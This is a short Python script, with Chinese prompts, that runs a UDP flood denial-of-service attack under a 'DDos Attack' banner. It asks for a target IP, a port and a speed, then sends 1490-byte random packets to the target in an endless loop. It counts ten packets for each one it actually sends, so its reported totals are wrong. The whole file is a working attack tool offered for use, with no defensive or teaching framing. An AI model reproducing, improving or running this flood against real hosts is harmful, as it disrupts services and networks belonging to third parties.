import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
try:
    os.system("figlet DDos Attack")
except Exception:
    print("请先安装 figlet 工具（sudo apt install figlet）")

# 输入处理
ip = input("请输入 IP: ")
while True:
    try:
        port = int(input("攻击端口: "))
        break
    except ValueError:
        print("端口必须为数字，请重新输入。")
while True:
    try:
        sd = int(input("攻击速度(1~1000): "))
        if 1 <= sd <= 1000:
            break
        else:
            print("攻击速度必须在1~1000之间。")
    except ValueError:
        print("攻击速度必须为数字，请重新输入。")

os.system("clear")

sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 10
        print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
        sleep_time = max((1000 - sd) / 2000, 0)
        time.sleep(sleep_time)
except KeyboardInterrupt:
    print("\n攻击已手动停止。")
except Exception as e:
    print(f"\n发生错误: {e}")